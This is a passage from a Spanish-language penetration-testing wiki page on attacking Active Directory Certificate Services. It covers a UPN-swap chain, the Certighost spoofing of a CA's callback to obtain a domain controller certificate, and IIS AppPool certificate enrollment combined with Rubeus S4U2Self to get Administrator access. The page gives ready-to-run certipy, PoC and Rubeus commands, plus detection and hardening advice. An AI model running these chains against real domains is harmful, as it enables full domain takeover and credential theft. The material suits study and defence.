    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Paso 5: Revierte el UPN de la cuenta «victim».**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Paso 6: En un KDC antiguo o en modo de compatibilidad que acepte esta asignación débil, autentícate como administrador de destino.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Sustitución de identidad mediante callback de seguimiento de LDAP/LSA malicioso (Certighost / CVE-2026-54121)

### Explicación

**Certighost** abusa de una **ruta de seguimiento de inscripción / callback de AD CS** en la que la CA confía en los atributos de solicitud proporcionados por el solicitante para resolver la identidad que debe incluirse en el certificado emitido. En la PoC pública, la solicitud manipulada incluye:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP controlado por el atacante al que se conectará la CA
- **`rmd`**: el **nombre DNS del Domain Controller objetivo** que se va a suplantar

Si la CA sigue esa ruta, se conectará al atacante mediante **SMB/LSA (`445`)** y **LDAP (`389`)**. El atacante usa una **cuenta de equipo real** (normalmente creada mediante el valor predeterminado de **`ms-DS-MachineAccountQuota`**) para que la sesión de callback se autentique como una entidad de seguridad válida del dominio, pero los servicios maliciosos devuelven los atributos de identidad del **DC objetivo**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Si la CA **no vincula criptográficamente la identidad devuelta con la entidad de seguridad autenticada en el callback**, puede emitir un certificado para el **Domain Controller**, aunque la sesión se haya autenticado como la cuenta de equipo controlada por el atacante. Conceptualmente, esto hace que el fallo sea distinto de **Certifried**: en lugar de modificar atributos de AD, como `dNSHostName`, el atacante **sustituye los datos de identidad durante la resolución de callback de la CA**.<sup>[[2]](#references)</sup>

**Requisitos previos útiles:**

- **Credenciales de dominio** con pocos privilegios
- Capacidad para **crear o reutilizar una cuenta de equipo**
- Conectividad de red desde la **CA** a los **puertos `389` y `445`** controlados por el atacante
- Ruta de solicitud de CA vulnerable o sin parchear (la actualización de Microsoft del **14 de julio de 2026** añadió **validación del DC para `cdc`** y una **comparación del SID resuelto**)

El **`.pfx`** resultante puede usarse para **PKINIT**, lo que produce un **`.ccache`** y, en el flujo de la PoC publicada, el **hash NT del DC objetivo**, que normalmente basta para lograr el **compromiso total del dominio**.

### Abuso

La PoC pública automatiza toda la cadena:<sup>[[1]](#references)</sup>

1. Crear o reutilizar una **cuenta de equipo** controlada por el atacante.
2. Iniciar **listeners maliciosos de LDAP y SMB/LSA** en `389` y `445`.
3. Enviar una solicitud de certificado que contenga los atributos **`cdc`** controlado por el atacante y **`rmd`** del objetivo.
4. Permitir que la CA se autentique en los listeners maliciosos como la cuenta de equipo controlada, pero responder a las consultas de identidad con los atributos del **DC objetivo**.
5. Recibir un **certificado de DC** firmado por la CA y usarlo para **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Indicadores de runtime útiles del PoC:

- `--listener <ip>`: elige explícitamente la IP de callback anunciada en `cdc`
- `--computer-name <NAME$>`: reutiliza una cuenta de equipo existente en lugar de crear una nueva

**Notas operativas:**

- El PoC necesita **root** porque se enlaza a los **puertos privilegiados** `389` y `445`.
- Una explotación exitosa escribe localmente un **DC `.pfx`** y un **Kerberos `.ccache`**.
- Como el certificado se asigna a una **cuenta de Domain Controller**, las acciones posteriores pueden incluir **autenticación Kerberos basada en certificados**, **DCSync** y la reutilización del **hash NT de equipo** recuperado.<sup>[[2]](#references)</sup>

## Inscripción de IIS AppPool para obtener Administrator en el mismo host

Un pool de IIS que se ejecuta como `ApplicationPoolIdentity` usa la **cuenta de equipo** de su host para acceder a recursos de red salientes. Por lo tanto, la ejecución de código como `IIS AppPool\<POOL>` sigue teniendo pocos privilegios en el token local, pero puede enviar una solicitud a AD CS que la CA autentica como `HOST$`; esto es una transición de identidad saliente, no una suplantación de token ni una elevación local al estilo Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Esta cadena requiere un host de IIS unido al dominio, una Enterprise CA accesible mediante RPC, una plantilla de autenticación de equipo publicada para la que el equipo tenga permisos de inscripción, compatibilidad con PKINIT y conectividad con KDC/SMB. Una identidad de pool personalizada cambia el principal saliente, así que confirma que el pool realmente usa `ApplicationPoolIdentity` antes de asumir que es `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Inscripción con una clave controlada por el atacante

Genera el par de claves y el CSR fuera del servidor de IIS y conserva la clave privada. Envía **solo el CSR** desde el worker comprometido. El [PoC ASPX Certi-Bhai](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancia `CertificateAuthority.Request`, establece `CertificateTemplate:Machine`, llama a `ICertRequest::Submit` y devuelve el certificado emitido. Usa la cadena de configuración de la CA `CAHOST\CA-NAME`; una plantilla `Machine` normal crea el sujeto a partir de AD, así que no se necesitan datos de sujeto/SAN proporcionados por el solicitante.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Combina el certificado devuelto con la **clave conservada correspondiente**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` solo funciona cuando Windows ya puede asociar el certificado con una clave privada accesible; para archivos PEM separados, crea explícitamente un PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Usa el PFX para PKINIT y conserva el TGT del equipo devuelto en formato base64 en lugar de inyectarlo inmediatamente:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self más sustitución de servicio en el mismo host

S4U2Self permite que un servicio obtenga un ticket **para sí mismo** que contiene los datos de autorización de otro usuario. Con el TGT del equipo, Rubeus puede solicitar ese ticket para un usuario privilegiado, reescribir el nombre del servicio en el KRB-CRED devuelto como CIFS e inyectarlo. Esta es la primitiva local «delegate to thyself»: no requiere S4U2Proxy ni una entrada `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

El ticket sustituido solo puede ser utilizado por servicios de la **misma cuenta/clave de equipo** (en este caso, CIFS en `HOST`). No es un ticket de Administrator reutilizable en otros equipos del dominio. Además, el resultado demostrado es acceso privilegiado a SMB/sistema de archivos como Administrator; obtener un proceso local `NT AUTHORITY\SYSTEM` sigue requiriendo un paso independiente de ejecución remota.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detección y hardening

- En la CA, correlacione los eventos de Certification Services **4886** (solicitud recibida) y **4887** (certificado emitido) para detectar solicitudes inesperadas de la plantilla `Machine` realizadas por cuentas de servidores IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- En los DC, el evento **4768** incluye campos de certificado cuando se usa la preautenticación con certificados; genere alertas ante solicitudes PKINIT de TGT inusuales para cuentas de servidores web. A continuación, revise las solicitudes **4769** que impliquen una identidad privilegiada suplantada y el mismo host. Como Rubeus modifica el nombre del servicio de KRB-CRED en el cliente mediante `/altservice`, no exija que el nombre del servicio 4769 del lado del DC sea `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Busque casos en los que `w3wp.exe` se conecte a endpoints RPC de CA, creación inesperada de archivos ASPX, acceso a recursos compartidos administrativos mediante Kerberos y actividad de extracción de secretos. Cuando sea posible, restrinja el acceso desde el nivel de aplicaciones a CA RPC/KDC/SMB y elimine los permisos de inscripción de equipos o las plantillas de autenticación de máquina que no sean operativamente necesarios.<sup>[[19]](#references)</sup>

## Comprometer bosques con certificados explicado en voz pasiva

### Ruptura de relaciones de confianza entre bosques mediante CA comprometidas

La configuración para la **inscripción entre bosques** es relativamente sencilla. Los administradores **publican el certificado de la CA raíz** del bosque de recursos en los bosques de cuentas, y los certificados de la **CA empresarial** del bosque de recursos se **agregan a los contenedores `NTAuthCertificates` y AIA de cada bosque de cuentas**. Para aclararlo, esta configuración otorga a la **CA del bosque de recursos control completo** sobre todos los demás bosques para los que administra PKI. Si los **atacantes comprometen esta CA**, podrían **falsificar** certificados para todos los usuarios de los bosques de recursos y de cuentas, quebrantando así el límite de seguridad del bosque.<sup>[[6]](#references)</sup>

### Privilegios de inscripción concedidos a principales externos

En entornos con varios bosques, se debe tener cuidado con las CA empresariales que **publican plantillas de certificados** que permiten la **inscripción y la edición a Authenticated Users o a principales externos** (usuarios/grupos externos al bosque al que pertenece la CA empresarial).\
Al autenticarse a través de una relación de confianza, AD agrega el **SID de Authenticated Users** al token del usuario. Por tanto, si un dominio tiene una CA empresarial con una plantilla que **permite la inscripción a Authenticated Users**, un usuario de otro bosque podría **inscribirse en esa plantilla**. Del mismo modo, si una plantilla **concede explícitamente permisos de inscripción a un principal externo**, se crea una **relación de control de acceso entre bosques**, lo que permite a un principal de un bosque **inscribirse en una plantilla de otro bosque**.

Ambos escenarios **amplían la superficie de ataque** de un bosque a otro. Un atacante podría explotar la configuración de la plantilla de certificado para obtener privilegios adicionales en un dominio externo.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 repositorio de PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Análisis técnico de Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog de SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certificado de origen: abuso de Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, GUI de BloodHound, nuevos métodos de autenticación y solicitud, y más](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: abuso de la asignación de cuentas mediante Key Trust para tomar el control de cuentas](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – La historia del uso (indebido) de Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Retransmisión a AD Certificate Services mediante RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: acceso de shell a una CA de ADCS con YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Técnica de abuso ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Técnica de abuso ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Wiki de Certipy – Escalada de privilegios (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: no es otro ESC de AD CS más](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: configuración incorrecta y explotación](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Revisión de «Delegate 2 Thyself»](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC de inscripción de IIS en AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Escalada de privilegios desde IIS AppPool mediante el endpoint RPC de AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identidades de Application Pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Especificaciones abiertas de Microsoft – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – comando pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Auditar Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Evento 4768: se solicitó un ticket de autenticación Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Evento 4769: se solicitó un ticket de servicio Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – Kit de herramientas de explotación de AD CS para PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
